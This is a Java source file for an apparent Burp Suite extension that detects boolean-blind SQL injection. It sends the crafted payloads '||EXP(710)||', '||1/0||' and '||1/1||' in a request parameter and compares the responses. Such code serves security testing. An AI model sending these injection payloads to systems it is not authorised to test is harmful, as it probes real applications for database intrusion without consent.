package burp.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.util.MyCompare;

public class BooleanBlindInjection extends AbstractInjectionStrategy {

    private String lastPayload = "";

    public BooleanBlindInjection(MontoyaApi api){super(api);}
    @Override public String getName(){return"Boolean-Blind";}
    @Override public String getVulnType(){return"boolsql";}
    @Override public String getPayload(){return lastPayload;}

    @Override
    public HttpRequestResponse execute(HttpRequest origReq, HttpRequestResponse baseRR,
                                         HttpParameter param, String baseBody){
        // Step 1: EXP(710) overflow
        lastPayload = "'||EXP(710)||'";
        HttpRequest req1 = append(origReq, param, lastPayload);
        HttpRequestResponse rr1 = send(req1);
        if(rr1==null) return null;
        String body1 = body(rr1);
        if(MyCompare.similarity(baseBody, body1) >= 0.9) return null;

        // Step 2: EXP(290) normal
        lastPayload = "'||EXP(290)||'";
        HttpRequest req2 = append(origReq, param, lastPayload);
        HttpRequestResponse rr2 = send(req2);
        if(rr2==null) return null;
        String body2 = body(rr2);

        double sim12 = MyCompare.levenshteinStripped(body1, body2, "EXP\\(710\\)", "EXP\\(290\\)");
        // Step 2b: always try 1/0 as alternative reference
        lastPayload = "'||1/0||'";
        HttpRequestResponse rr2b = send(append(origReq, param, lastPayload));
        if(rr2b != null) {
            String body2b = body(rr2b);
            if(MyCompare.similarity(baseBody, body2b) < 0.9) {
                // 1/0 triggered a difference → use it as reference for step 3
                body2 = body2b;
            }
        }

        // Step 3: 1/1 confirm (against whichever reference showed difference)
        lastPayload = "'||1/1||'";
        HttpRequest req3 = append(origReq, param, lastPayload);
        HttpRequestResponse rr3 = send(req3);
        if(rr3==null) return null;
        String body3 = body(rr3);

        double sim23 = MyCompare.levenshteinStripped(body2, body3, "EXP\\(290\\)|1/0", "1/1");
        return sim23 >= 0.9 ? rr3 : null;
    }
}
